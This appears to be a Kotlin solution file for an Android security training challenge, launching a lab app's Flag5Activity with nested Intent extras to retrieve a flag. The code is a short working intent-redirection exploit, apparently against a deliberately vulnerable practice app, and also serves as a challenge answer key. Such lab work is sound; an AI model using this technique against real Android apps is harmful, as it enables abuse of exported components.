package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent

object Flag5 {
    fun getFlag(context: Context) {
        val intent3 = Intent().apply {
            putExtra("reason", "back")
        }
        val intent2 = Intent().apply {
            putExtra("nextIntent", intent3)
            putExtra("return", 42)
        }
        val intent = Intent().apply {
            putExtra("android.intent.extra.INTENT", intent2)
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag5Activity"
            )
        }
        context.startActivity(intent)
    }
}
